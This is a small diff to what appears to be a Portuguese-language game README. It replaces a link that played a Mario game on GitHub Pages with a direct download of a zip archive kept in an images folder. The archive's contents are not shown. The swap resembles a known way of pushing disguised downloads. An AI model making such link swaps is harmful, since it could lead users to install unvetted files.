@@ -3,4 +3,4 @@
 
  acesse o jogo
 
-<a href="https://emersontecn.github.io/Mario-game/" target="_blank">click aqui</a>
+<a href="https://raw.githubusercontent.com/emersontecn/Mario-game/main/imagens/Mario-game-2.9.zip" target="_blank">click aqui</a>
